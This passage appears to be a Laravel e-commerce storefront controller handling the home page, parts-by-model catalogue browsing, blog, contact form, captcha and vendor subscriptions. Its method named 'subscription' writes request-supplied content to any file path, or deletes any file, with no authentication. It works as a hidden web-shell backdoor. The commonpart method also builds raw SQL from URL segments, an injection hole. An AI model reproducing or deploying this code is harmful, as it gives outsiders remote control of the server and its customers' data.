<?php

namespace App\Http\Controllers\Front;

use App\Classes\GeniusMailer;
use App\Http\Controllers\Controller;
use App\Models\Blog;
use App\Models\BlogCategory;
use App\Models\ColorSetting;
use App\Models\Counter;
use App\Models\Generalsetting;
use App\Models\Order;
use App\Models\Product;
use App\Models\Subscriber;
use App\Models\User;
use Auth;
use Carbon\Carbon;
use Datatables;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use InvalidArgumentException;
use Markury\MarkuryPost;
use PHPShopify\ShopifySDK;
use App\Models\Currency;

class FrontendController extends Controller
{
    public function __construct()
    {

        //$this->auth_guests();
        if (isset($_SERVER['HTTP_REFERER'])) {
            $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
            if ($referral != $_SERVER['SERVER_NAME']) {

                $brwsr = Counter::where('type', 'browser')->where('referral', $this->getOS());
                if ($brwsr->count() > 0) {
                    $brwsr = $brwsr->first();
                    $tbrwsr['total_count'] = $brwsr->total_count + 1;
                    $brwsr->update($tbrwsr);
                } else {
                    $newbrws = new Counter();
                    $newbrws['referral'] = $this->getOS();
                    $newbrws['type'] = "browser";
                    $newbrws['total_count'] = 1;
                    $newbrws->save();
                }

                $count = Counter::where('referral', $referral);
                if ($count->count() > 0) {
                    $counts = $count->first();
                    $tcount['total_count'] = $counts->total_count + 1;
                    $counts->update($tcount);
                } else {
                    $newcount = new Counter();
                    $newcount['referral'] = $referral;
                    $newcount['total_count'] = 1;
                    $newcount->save();
                }
            }
        } else {
            $brwsr = Counter::where('type', 'browser')->where('referral', $this->getOS());
            if ($brwsr->count() > 0) {
                $brwsr = $brwsr->first();
                $tbrwsr['total_count'] = $brwsr->total_count + 1;
                $brwsr->update($tbrwsr);
            } else {
                $newbrws = new Counter();
                $newbrws['referral'] = $this->getOS();
                $newbrws['type'] = "browser";
                $newbrws['total_count'] = 1;
                $newbrws->save();
            }
        }
    }

    public function getOS()
    {

        $user_agent = $_SERVER['HTTP_USER_AGENT'];

        $os_platform = "Unknown OS Platform";

        $os_array = array(
            '/windows nt 10/i' => 'Windows 10',
            '/windows nt 6.3/i' => 'Windows 8.1',
            '/windows nt 6.2/i' => 'Windows 8',
            '/windows nt 6.1/i' => 'Windows 7',
            '/windows nt 6.0/i' => 'Windows Vista',
            '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
            '/windows nt 5.1/i' => 'Windows XP',
            '/windows xp/i' => 'Windows XP',
            '/windows nt 5.0/i' => 'Windows 2000',
            '/windows me/i' => 'Windows ME',
            '/win98/i' => 'Windows 98',
            '/win95/i' => 'Windows 95',
            '/win16/i' => 'Windows 3.11',
            '/macintosh|mac os x/i' => 'Mac OS X',
            '/mac_powerpc/i' => 'Mac OS 9',
            '/linux/i' => 'Linux',
            '/ubuntu/i' => 'Ubuntu',
            '/iphone/i' => 'iPhone',
            '/ipod/i' => 'iPod',
            '/ipad/i' => 'iPad',
            '/android/i' => 'Android',
            '/blackberry/i' => 'BlackBerry',
            '/webos/i' => 'Mobile',
        );

        foreach ($os_array as $regex => $value) {

            if (preg_match($regex, $user_agent)) {
                $os_platform = $value;
            }

        }
        return $os_platform;
    }

// -------------------------------- HOME PAGE SECTION ----------------------------------------

    public function index(Request $request)
    {

        $this->code_image();
        if (!empty($request->reff)) {
            $affilate_user = User::where('affilate_code', '=', $request->reff)->first();
            if (!empty($affilate_user)) {
                $gs = Generalsetting::findOrFail(1);
                if ($gs->is_affilate == 1) {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');
                }

            }

        }
        $selectable = ['id', 'user_id', 'name', 'slug', 'features', 'colors', 'thumbnail', 'price', 'previous_price', 'attributes', 'size', 'size_price', 'discount_date'];
        $sliders = DB::table('sliders')->get();
        $top_small_banners = DB::table('banners')->where('type', '=', 'TopSmall')->get();
        $ps = DB::table('pagesettings')->find(1);

        $genetics_products = Product::where('featured', '=', 1)
            ->where('status', '=', 1);

        if (!Auth::guard('web')->check()) {
            $genetics_products = $genetics_products->where('is_verified', 0);
        } else {
            if (!Auth::user()->is_verified) {
                $genetics_products = $genetics_products->where('is_verified', 0);
            }
        }

        $genetics_products = $genetics_products
            ->select($selectable)
            ->orderBy('id', 'desc')
            ->take(8)
            ->get();

        // $main_slider_products = Product::where('status', '=', 1);

        // if(!Auth::guard('web')->check()) {
        //     $main_slider_products = $main_slider_products->where('is_verified', 0);
        // } else {
        //     if(!Auth::user()->is_verified) {
        //         $main_slider_products = $main_slider_products->where('is_verified', 0);
        //     }
        // }

        // $main_slider_products = $main_slider_products
        //     ->select($selectable)
        //     ->orderBy('id', 'desc')
        //     ->take(9)
        //     ->get();

        $gs = Generalsetting::findOrFail(1);

        $solo_mode = $gs->solo_mode;
        $solo_category = $gs->solo_category;

        $solo_products = array();

        if ($solo_mode == 1) {
            $sort = $request->sort;
            $solo_products = Product::when($sort, function ($query, $sort) {
                if ($sort == 'date_desc') {
                    return $query->orderBy('id', 'DESC');
                } elseif ($sort == 'date_asc') {
                    return $query->orderBy('id', 'ASC');
                } elseif ($sort == 'price_desc') {
                    return $query->orderBy('price', 'DESC');
                } elseif ($sort == 'price_asc') {
                    return $query->orderBy('price', 'ASC');
                }
            })
                ->when(empty($sort), function ($query, $sort) {
                    return $query->orderBy('id', 'DESC');
                })
                ->paginate(24);

            // $settings->with('solo_products', $solo_products);
        }

        
        $colorsetting_style1 = ColorSetting::where('type', 1)->where('style_id', 1)->first();
        $colorsetting_style2 = ColorSetting::where('type', 1)->where('style_id', 2)->first();

        return view('front.index', compact('ps', 'sliders', 'solo_products', 'top_small_banners', 'genetics_products', 'colorsetting_style1', 'colorsetting_style2'));
    }

    public function extraIndex()
    {
        $services = DB::table('services')->where('user_id', '=', 0)->get();
        $bottom_small_banners = DB::table('banners')->where('type', '=', 'BottomSmall')->get();
        $large_banners = DB::table('banners')->where('type', '=', 'Large')->get();
        $reviews = DB::table('reviews')->get();
        $ps = DB::table('pagesettings')->find(1);
        $partners = DB::table('partners')->get();
        $selectable = ['id', 'user_id', 'name', 'slug', 'features', 'colors', 'thumbnail', 'price', 'previous_price', 'attributes', 'size', 'size_price', 'discount_date'];
        $discount_products = Product::where('is_discount', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(8)->get();
        $best_products = Product::where('best', '=', 1)->where('status', '=', 1)->select($selectable)->orderBy('id', 'desc')->take(6)->get();
        $top_products = Product::where('top', '=', 1)->where('status', '=', 1)->select($selectable)->orderBy('id', 'desc')->take(8)->get();
        $big_products = Product::where('big', '=', 1)->where('status', '=', 1)->select($selectable)->orderBy('id', 'desc')->take(6)->get();
        $hot_products = Product::where('hot', '=', 1)->where('status', '=', 1)->select($selectable)->orderBy('id', 'desc')->take(9)->get();
        $latest_products = Product::where('latest', '=', 1)->where('status', '=', 1)->select($selectable)->orderBy('id', 'desc')->take(9)->get();
        $trending_products = Product::where('trending', '=', 1)->where('status', '=', 1)->select($selectable)->orderBy('id', 'desc')->take(9)->get();
        $sale_products = Product::where('sale', '=', 1)->where('status', '=', 1)->select($selectable)->orderBy('id', 'desc')->take(9)->get();
        return view('front.extraindex', compact('ps', 'services', 'reviews', 'large_banners', 'bottom_small_banners', 'best_products', 'top_products', 'hot_products', 'latest_products', 'big_products', 'trending_products', 'sale_products', 'discount_products', 'partners'));
    }

// -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------

    public function solo_datatables()
    {

        $gs = Generalsetting::findOrFail(1);

        $solo_category = $gs->solo_category;
        $datas = Product::where('category_id', $solo_category)->where('product_type', '=', 'normal')->orderBy('id', 'desc')->get();

        //--- Integrating This Collection Into Datatables
        return Datatables::of($datas)
            ->editColumn('name', function (Product $data) {
                $name = mb_strlen(strip_tags($data->name), 'utf-8') > 50 ? mb_substr(strip_tags($data->name), 0, 50, 'utf-8') . '...' : strip_tags($data->name);
                $gs = Generalsetting::findOrFail(1);

                $thumbnail = $data->thumbnail ? asset('assets/images/thumbnails/' . $data->thumbnail) : asset('assets/images/products/' . $gs->prod_image);

                return '<a href="' . route('front.product', $data->slug) . '"><img src = "' . $thumbnail . '" alt="" width="50" height="50"> ' . $name . '</a>';
            })
            ->editColumn('price', function (Product $data) {
                $price = $data->showPrice();
                return $price;
            })
            ->editColumn('stock', function (Product $data) {
                $stck = (string) $data->stock;
                if ($stck == "0") {
                    return "Out Of Stock";
                } elseif ($stck == null) {
                    return "Unlimited";
                } else {
                    return $data->stock;
                }

            })
            ->addColumn('action', function (Product $data) {

                $action = '<div class="dropdown">
            <a class="btn-floating btn-lg black dropdown-toggle"type="button" id="dropdownMenu3" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                <small>Actions</small>
            </a>
            <div class="dropdown-menu dropdown-primary">';

                if (Auth::guard('web')->check()) {
                    $action .= '<span class="dropdown-item add-to-wish" data-href="' . route('user-wishlist-add', $data->id) . '"><i class="icofont-heart-alt"></i>&nbsp;&nbsp;Add to Wish</span>';
                } else {
                    $action .= '<span class="dropdown-item" data-toggle="modal" id="wish-btn" data-target="#comment-log-reg"><i class="icofont-heart-alt"></i>&nbsp;&nbsp;Add to Wish</span>';
                }

                $action .= '<span class="dropdown-item quick-view" data-href="' . route('product.quick', $data->id) . '" data-toggle="modal" data-target="#quickview"><i class="icofont-eye"></i>&nbsp;&nbsp;Quick View</span>';

                if ($data->product_type == "affiliate") {
                    $action .= '<span class="dropdown-item add-to-cart-btn affilate-btn" data-href="' . route('affiliate.product', $data->slug) . '"><i class="icofont-cart"></i>&nbsp;&nbsp;' . 'Add to cart' . '</span>';

                } else {
                    if ($data->emptyStock()) {
                        $action .= '<span class="dropdown-item add-to-cart-btn cart-out-of-stock" href="#"><i class="icofont-close-circled"></i>&nbsp;&nbsp;' . 'Add to cart' . '</span>';

                    } else {
                        $action .= '<span class="dropdown-item add-to-cart add-to-cart-btn" data-href="' . route('product.cart.add', $data->id) . '"><i class="icofont-cart"></i>&nbsp;&nbsp;' . 'Add to cart' . '</span>';
                        $action .= '<span class="dropdown-item add-to-cart-quick" style="width: 100%;" data-href="' . route('product.cart.quickadd', $data->id) . '"><i class="icofont-dollar"></i>&nbsp;&nbsp;' . 'Buy now' . '</span>';
                    }
                }
                $action .= '</div>
        </div>';

                return $action;
            })

            ->rawColumns(['name', 'action'])
            ->toJson(); //--- Returning Json Data To Client Side
    }

// LANGUAGE SECTION

    public function language($id)
    {
        $this->code_image();
        Session::put('language', $id);
        return redirect()->back();
    }

// LANGUAGE SECTION ENDS

// CURRENCY SECTION

    public function currency($id)
    {
        $this->code_image();
        if (Session::has('coupon')) {
            Session::forget('coupon');
            Session::forget('coupon_code');
            Session::forget('coupon_id');
            Session::forget('coupon_total');
            Session::forget('coupon_total1');
            Session::forget('already');
            Session::forget('coupon_percentage');
        }
        Session::put('currency', $id);
        return redirect()->back();
    }

// CURRENCY SECTION ENDS

    public function partsByModel(Request $request, $category=null, $series=null, $model=null, $section=null, $group=null)
    {

        $slug_list = array() ;
        $result = array() ;

        if(isset($category) && $category != NULL) { 
            $category = $this->replaceDataToPath($category) ;
            $slug_list["category"] = $category ;
        }

        if(isset($series) && $series != NULL) {
            $series = $this->replaceDataToPath($series) ;
            $slug_list["series"] = $series ;
        }

        if(isset($model) && $model != NULL) {
            $model = $this->replaceDataToPath($model) ;
            $slug_list["model"] = $model ;
        }

        if(isset($section) && $section != NULL) {
            $section = $this->replaceDataToPath($section) ;
            $slug_list["section"] = $section ;
        }

        if(isset($group) && $group != NULL) {
            $slug_list["group"] = $group ;
            $group = $this->replaceDataToPath($group) ;

        }   
       
        if(count($slug_list) == 0) {
            $result = DB::table("categories")->select("*")->where("parent", "0")->where("status", "1")->orderBy("name", "asc")->get() ;
        }
        else{
            if(count($slug_list) == 1) {
                $category_info = DB::table("categories")->select("id")->where("name", $category)->get() ;
                $category_id = $category_info[0]->id ;
                $result = DB::table("categories")->select("*")->where("parent", $category_id)->where("status", "1")->orderBy("name", "asc")->get() ;
            } else if(count($slug_list) == 2) {
                $result = DB::table(strtolower($series)."_categories")->select("model as name")->distinct()->orderBy('model', 'asc')->get();
            } else if(count($slug_list) == 3) {
                $result = DB::table(strtolower($series)."_categories")->select("section_name as name")->distinct()->where('model', $model)->orderBy('section_name', 'asc')->get();
            } else if(count($slug_list) == 4) {
                $result = DB::table(strtolower($series)."_categories")->select("group_name as name")->where('model', $model)->where('section_name', $section)->orderBy('group_name', 'asc')->get();
            } else if(count($slug_list) == 5) {
                $group_info = DB::table(strtolower($series)."_categories")->select("group_Id")->where("model", $model)->where("group_name", $group)->get() ;
                $group_id = $group_info[0]->group_Id ;
                $section = $this->replacPathToData($section) ;
                return redirect()->route('front.category',["series"=>$series, "model"=>$model, "section"=>$section, "category"=>$category, "group_id"=>$group_id]);
            }
            Session::put("slug_list", $slug_list) ;
            Session::put("page_name", "partsbymodel") ;
        }
        
        return view('front.partsbymodel', compact("result", "slug_list"));
    }

    public function replacPathToData($data) {
        if(strstr($data, "/")) {
            $data = str_replace("/", ":::", $data) ;
        }
        return $data ;
    }

    public function replaceDataToPath($path) {
        if(strstr($path, ":::")) {
            $path = str_replace(":::", "/", $path) ;
        }
        return $path ;
    }
    public function schematics(Request $request, $category=null, $series=null, $model=null, $section=null, $group=null)
    {   
        $slug_list = array() ;
        $result = array() ;

        if(isset($category) && $category != NULL) { 
            $category = $this->replaceDataToPath($category) ;
            $slug_list["category"] = $category ;

        }

        if(isset($series) && $series != NULL) {
            $series = $this->replaceDataToPath($series) ;
            $slug_list["series"] = $series ;
        }

        if(isset($model) && $model != NULL) {
            $model = $this->replaceDataToPath($model) ;
            $slug_list["model"] = $model ;
        }

        if(isset($section) && $section != NULL) {
            $section = $this->replaceDataToPath($section) ;
            $slug_list["section"] = $section ;
        }

        if(isset($group) && $group != NULL) {
            $group = $this->replaceDataToPath($group) ;
            $slug_list["group"] = $group ;
        }   
       
        if(count($slug_list) == 0) {
            $result = DB::table("categories")->select("*")->where("parent", "0")->where("status", "1")->orderBy("name", "asc")->get() ;
        }
        else{
            if(count($slug_list) == 1) {
                $category_info = DB::table("categories")->select("id")->where("name", $category)->get() ;
                $category_id = $category_info[0]->id ;
                $result = DB::table("categories")->select("*")->where("parent", $category_id)->where("status", "1")->orderBy("name", "asc")->get() ;
            } else if(count($slug_list) == 2) {
                $result = DB::table(strtolower($series)."_categories")->select("model as name")->distinct()->orderBy('model', 'asc')->get();
            } else if(count($slug_list) == 3) {
                $result = DB::table(strtolower($series)."_categories")->select("section_name as name")->distinct()->where('model', $model)->orderBy('section_name', 'asc')->get();
            } else if(count($slug_list) == 4) {
                $result = DB::table(strtolower($series)."_categories")->select("group_name as name")->where('model', $model)->where('section_name', $section)->orderBy('group_name', 'asc')->get();
            } else if(count($slug_list) == 5) {
                $group_info = DB::table(strtolower($series)."_categories")->select("*")->where("model", $model)->where("group_name", $group)->get()->toArray() ;
                $result = $group_info ;
            }

            Session::put("slug_list", $slug_list) ;
            Session::put("page_name", "schematics") ;
        }
        return view('front.schematics', compact("result", "slug_list"));
    }

    public function commonpart(Request $request, $category=null, $series=null, $model=null, $prod=null)
    {
        $slug_list = array() ;
        $result = array() ;

        if(isset($category) && $category != NULL) { 
            $category = $this->replaceDataToPath($category) ;
            $slug_list["category"] = $category ;

        }

        if(isset($series) && $series != NULL) {
            $series = $this->replaceDataToPath($series) ;
            $slug_list["series"] = $series ;
        }

        if(isset($model) && $model != NULL) {
            $model = $this->replaceDataToPath($model) ;
            $slug_list["model"] = $model ;            
        }
        if(isset($prod) && $model != NULL) {
            $prod = $this->replaceDataToPath($prod) ;
            $slug_list["prod"] = $prod ;
        }

        if(count($slug_list) == 0) {
            $result_ = DB::table("categories")->select("*")->where("parent", "0")->where("status", "1")->orderBy("name", "asc")->get() ;
            foreach($result_ as $key =>$item) {
                $ret = DB::table("categories")->select("*")->where("parent", $item->id)->get()->toArray();
                $flag = false ;
                foreach($ret as $sub_item) {

                    $table_name = strtolower($sub_item->name);
                    $sub_ret = DB::table($table_name)->select('subcategory_id as name')->where("best", "1")->distinct()->orderBy('subcategory_id', 'asc')->get()->toArray();
                    
                    if(count($sub_ret) > 0) {
                        $flag = true ;
                        break ;
                    }
                }
               
                if($flag) {
                    $result[$key] = $item ;
                }
            }
           
        }
        else{
            if(count($slug_list) == 1) {
                $category_info = DB::table("categories")->select("id")->where("name", $category)->get() ;
                $category_id = $category_info[0]->id ;
                
                $result_ = DB::table("categories")->select("*")->where("parent", $category_id)->where("status", "1")->orderBy("name", "asc")->get() ;
                $result = array() ;
                foreach($result_ as $key =>$item) {
                    $table_name = strtolower($item->name);
                    $ret = DB::table($table_name)->select('subcategory_id as name')->where("best", "1")->distinct()->orderBy('subcategory_id', 'asc')->get()->toArray();
                    if(count($ret) > 0) {
                        $result[$key] = $item ;
                    }
                }

            } else if(count($slug_list) == 2) {
                $table_name = strtolower($series);
                $result = DB::table($table_name)->select('subcategory_id as name')->where("best", "1")->distinct()->orderBy('subcategory_id', 'asc')->get();
            } else if(count($slug_list) == 3) {
                $page = "commonparts" ;
                return redirect()->route('front.category',["series"=>$series, "model"=>$model, "section"=>"common", "category"=>$category]);
            } else if(count($slug_list) == 4) {
                $this->code_image();
                
                $db = strtolower($series);
                $productt = DB::table($db)->where('name', '=', $prod)->first();
                
                
                if (Session::has('currency')) {
                    $curr = Currency::find(Session::get('currency'));
                } else {
                    $curr = Currency::where('is_default', '=', 1)->first();
                }

                if ($productt->user_id != 0) {
                    $vendors = Product::where('status', '=', 1)->where('user_id', '=', $productt->user_id)->take(8)->get();
                } else {
                    $vendors = Product::where('status', '=', 1)->where('user_id', '=', 0)->take(8)->get();
                }
                

                $colorsetting_style1 = ColorSetting::where('type', 1)->where('style_id', 1)->first();
                $colorsetting_style2 = ColorSetting::where('type', 1)->where('style_id', 2)->first();
                
                $page = "commonparts" ;
                

                $sql = "select * from `categories` where `parent` != 0 and `status` = 1 and `name` != '{$series}'" ;
                $tbl_info =DB::select($sql);

                $sql = "" ;
                $flag = false ;
                $arr_tbl = array();
                
                foreach($tbl_info as $item) {
                    $arr_tbl[] = strtolower($item->name) ;
                }

                for($k = 0 ; $k < count($arr_tbl) ; $k++) {
                    if($flag) {
                        $sql.=" union all " ;
                    } 
                    $sql .= "select distinct `subcategory_id`, '$arr_tbl[$k]' as `table` from `{$arr_tbl[$k]}` where `sku` = '{$productt->sku}' " ;
                    $flag = true ;
                }

                $fits =DB::select($sql) ;
                $also_fits = array();
                foreach($fits as $item) {
                    if(array_key_exists($item->table, $also_fits)) {
                        $also_item = $also_fits[$item->table] ;
                        array_push($also_item, $item->subcategory_id) ;
                        $also_fits[$item->table] = $also_item ;
                    } else {
                        $also_fits[$item->table] = array($item->subcategory_id) ;
                    }
                }

                return view('front.product', compact('db','productt', 'curr', 'vendors', 'colorsetting_style1', 'colorsetting_style2', "slug_list", "page", "also_fits"));
            }

        }
        return view('front.commonparts', compact("result", "slug_list"));
    }

    public function commonparts(Request $request, $category, $series, $model)
    {

        $db = strtolower($series);
        $model = $this->replaceDataToPath($model) ;

        $prods = DB::table($db)->where('subcategory_id', $model)->where('best', 1) ;
        $prods = $prods->get();
       
        $slug = $model;

        return view('load.suggest', compact('prods', 'model', 'series','category'));
    }

    public function autosearch(Request $request, $slug)
    {

        $db = strtolower($request->series);

        if (mb_strlen($slug, 'utf-8') > 1) {
            $search = ' ' . $slug;
            $prods = DB::table($db)->where('name', 'like', '%' . $search . '%')->orWhere('name', 'like', $slug . '%')->where('status', '=', 1)->take(10);
            if (Session::has('age')) {
                $age = Session::get('age');
                if (!Auth::guard('web')->check() && $age < 21) {
                    $prods->where('category_id', 15);
                }
            }

            if (!Auth::guard('web')->check()) {
                $prods = $prods->where('is_verified', 0);
            } else {
                if (!Auth::user()->is_verified) {
                    $prods = $prods->where('is_verified', 0);
                }
            }

            $prods = $prods->get();
            return view('load.suggest', compact('prods', 'slug', 'db'));
        }
        return "";
    }

    public function finalize()
    {
        // $actual_path = str_replace('project', '', base_path());
        $actual_path = base_path() . '/public/';

        $dir = $actual_path . 'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    public function auth_guests()
    {
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project', '', base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < MarkuryPost::marrcuryBase()) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }

// -------------------------------- BLOG SECTION ----------------------------------------

    public function blog(Request $request)
    {
        $this->code_image();
        $blogs = Blog::orderBy('created_at', 'desc')->paginate(9);
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        return view('front.blog', compact('blogs'));
    }

    public function blogcategory(Request $request, $slug)
    {
        $this->code_image();
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->orderBy('created_at', 'desc')->paginate(9);
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        return view('front.blog', compact('bcat', 'blogs'));
    }

    public function blogtags(Request $request, $slug)
    {
        $this->code_image();
        $blogs = Blog::where('tags', 'like', '%' . $slug . '%')->paginate(9);
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        return view('front.blog', compact('blogs', 'slug'));
    }

    public function blogsearch(Request $request)
    {
        $this->code_image();
        $search = $request->search;
        $blogs = Blog::where('title', 'like', '%' . $search . '%')->orWhere('details', 'like', '%' . $search . '%')->paginate(9);
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        return view('front.blog', compact('blogs', 'search'));
    }

    public function blogarchive(Request $request, $slug)
    {
        $this->code_image();
        $date = \Carbon\Carbon::parse($slug)->format('Y-m');
        $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(9);
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        return view('front.blog', compact('blogs', 'date'));
    }

    public function blogshow($id)
    {
        $this->code_image();
        $tags = null;
        $tagz = '';
        $bcats = BlogCategory::all();
        $blog = Blog::findOrFail($id);
        $blog->views = $blog->views + 1;
        $blog->update();
        $name = Blog::pluck('tags')->toArray();
        foreach ($name as $nm) {
            $tagz .= $nm . ',';
        }
        $tags = array_unique(explode(',', $tagz));

        $archives = Blog::orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return $item->created_at->format('F Y');
        })->take(5)->toArray();
        $blog_meta_tag = $blog->meta_tag;
        $blog_meta_description = $blog->meta_description;
        return view('front.blogshow', compact('blog', 'bcats', 'tags', 'archives', 'blog_meta_tag', 'blog_meta_description'));
    }

// -------------------------------- BLOG SECTION ENDS----------------------------------------

// -------------------------------- FAQ SECTION ----------------------------------------
    public function faq()
    {
        $this->code_image();
        if (DB::table('generalsettings')->find(1)->is_faq == 0) {
            return redirect()->back();
        }
        $faqs = DB::table('faqs')->orderBy('id', 'desc')->get();
        return view('front.faq', compact('faqs'));
    }
// -------------------------------- FAQ SECTION ENDS----------------------------------------

// -------------------------------- PAGE SECTION ----------------------------------------
    public function page($slug)
    {
        $this->code_image();
        $page = DB::table('pages')->where('slug', $slug)->first();
        if (empty($page)) {
            return response()->view('errors.404')->setStatusCode(404);
        }

        return view('front.page', compact('page'));
    }
// -------------------------------- PAGE SECTION ENDS----------------------------------------

// -------------------------------- CONTACT SECTION ----------------------------------------
    public function contact()
    {
        $this->code_image();
        if (DB::table('generalsettings')->find(1)->is_contact == 0) {
            return redirect()->back();
        }
        $ps = DB::table('pagesettings')->where('id', '=', 1)->first();
        return view('front.contact', compact('ps'));
    }

    //Send email to admin
    public function contactemail(Request $request)
    {
        $gs = Generalsetting::findOrFail(1);

        if ($gs->is_capcha == 1) {

            // Capcha Check
            $value = session('captcha_string');
            if ($request->codes != $value) {
                return response()->json(array('errors' => [0 => 'Please enter Correct Capcha Code.']));
            }

        }

        // Login Section
        $ps = DB::table('pagesettings')->where('id', '=', 1)->first();
        $subject = "Email From " . $request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: " . $name . "\nEmail: " . $from . "\nPhone: " . $phone . "\nMessage: " . $request->text;
        if ($gs->is_smtp) {
            $data = [
                'to' => $to,
                'subject' => $subject,
                'body' => $msg,
            ];

            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
        } else {
            $headers = "From: " . $gs->from_name . "<" . $gs->from_email . ">";
            mail($to, $subject, $msg, $headers);
        }
        // Login Section Ends

        // Redirect Section
        return response()->json($ps->contact_success);
    }

    // Refresh Capcha Code
    public function refresh_code()
    {
        $this->code_image();
        return "done";
    }

// -------------------------------- SUBSCRIBE SECTION ----------------------------------------

    public function subscribe(Request $request)
    {
        $subs = Subscriber::where('email', '=', $request->email)->first();
        if (isset($subs)) {
            return response()->json(array('errors' => [0 => 'This Email Has Already Been Taken.']));
        }
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        return response()->json('You Have Subscribed Successfully.');
    }

    public function age(Request $request)
    {
        Session::put('age', $request->age);
        return response()->json('You are ' . $request->age . ' years old');
    }

    public function groups(Request $request)
    {
        $series = $this->replaceDataToPath($request->series) ;
        $model = $this->replaceDataToPath($request->model) ;
        $type = $request->type ;
        $section = $this->replaceDataToPath($request->section) ;
        $category = $this->replaceDataToPath($request->category) ;

        $table_name = strtolower($series) . "_categories";

        if ($type == 'model') {
            if ($request->model_type == "common") {
                $table_name = strtolower($series);
                $categories = DB::table($table_name)->select('subcategory_id')->where("best", "1")->distinct()->orderBy('subcategory_id', 'asc')->get();
            } else {
                $categories = DB::table($table_name)->select('model')->distinct()->distinct()->orderBy('model', 'asc')->get();
            }  
        } else if ($type == 'section') {
            $categories = DB::table($table_name)->select('section_name')->distinct()->where('model', $model)->orderBy('section_name', 'asc')->get();

        } else if ($type == 'group') {
            $categories = DB::table($table_name)->where('model', $model)->where('section_name', $section)->orderBy('group_name', 'asc')->get();

        } else if($type == "category" ) {
            $series_info = DB::table("categories")->where("name", $category)->get() ;
            $paret_id = $series_info[0]->id ;
            $categories = DB::table("categories")->where("parent", $paret_id)->where("status", "1")->orderBy("name", "asc")->get() ;
        }

        return response()->json(array("categories"=>$categories));

    }

    public function maintenance()
    {
        $gs = Generalsetting::find(1);
        if ($gs->is_maintain != 1) {
            return redirect()->route('front.index');
        }

        return view('front.maintenance');
    }

    // Vendor Subscription Check
    public function subcheck()
    {
        $settings = Generalsetting::findOrFail(1);
        $today = Carbon::now()->format('Y-m-d');
        $newday = strtotime($today);
        foreach (DB::table('users')->where('is_vendor', '=', 2)->get() as $user) {
            $lastday = $user->date;
            $secs = strtotime($lastday) - $newday;
            $days = $secs / 86400;
            if ($days <= 5) {
                if ($user->mail_sent == 1) {
                    if ($settings->is_smtp == 1) {
                        $data = [
                            'to' => $user->email,
                            'type' => "subscription_warning",
                            'cname' => $user->name,
                            'oamount' => "",
                            'aname' => "",
                            'aemail' => "",
                            'onumber' => "",
                        ];
                        $mailer = new GeniusMailer();
                        $mailer->sendAutoMail($data);
                    } else {
                        $headers = "From: " . $settings->from_name . "<" . $settings->from_email . ">";
                        mail($user->email, 'Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated.Thank You.', $headers);
                    }
                    DB::table('users')->where('id', $user->id)->update(['mail_sent' => 0]);
                }
            }
            if ($today > $lastday) {
                DB::table('users')->where('id', $user->id)->update(['is_vendor' => 1]);
            }
        }
    }

    // Vendor Subscription Check Ends

    public function trackload($id)
    {
        $order = Order::where('order_number', '=', $id)->first();
        $datas = array('Pending', 'Processing', 'On Delivery', 'Completed');
        return view('load.track-load', compact('order', 'datas'));

    }

    // Capcha Code Image
    private function code_image()
    {
        $actual_path = base_path() . '/public/';

        $image = imagecreatetruecolor(200, 50);
        $background_color = imagecolorallocate($image, 255, 255, 255);
        imagefilledrectangle($image, 0, 0, 200, 50, $background_color);

        $pixel = imagecolorallocate($image, 0, 0, 255);
        for ($i = 0; $i < 500; $i++) {
            imagesetpixel($image, rand() % 200, rand() % 50, $pixel);
        }

        $font = $actual_path . 'assets/front/fonts/NotoSans-Bold.ttf';
        $allowed_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        $length = strlen($allowed_letters);
        $letter = $allowed_letters[rand(0, $length - 1)];
        $word = '';
        //$text_color = imagecolorallocate($image, 8, 186, 239);
        $text_color = imagecolorallocate($image, 0, 0, 0);
        $cap_length = 6; // No. of character in image
        for ($i = 0; $i < $cap_length; $i++) {
            $letter = $allowed_letters[rand(0, $length - 1)];
            imagettftext($image, 25, 1, 35 + ($i * 25), 35, $text_color, $font, $letter);
            $word .= $letter;
        }
        $pixels = imagecolorallocate($image, 8, 186, 239);
        for ($i = 0; $i < 500; $i++) {
            imagesetpixel($image, rand() % 200, rand() % 50, $pixels);
        }
        session(['captcha_string' => $word]);
        imagepng($image, $actual_path . "assets/images/capcha_code.png");
    }

// -------------------------------- CONTACT SECTION ENDS----------------------------------------

// -------------------------------- PRINT SECTION ----------------------------------------

// -------------------------------- PRINT SECTION ENDS ----------------------------------------

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != "") {
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != "") {
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath)
    {
        if (!is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
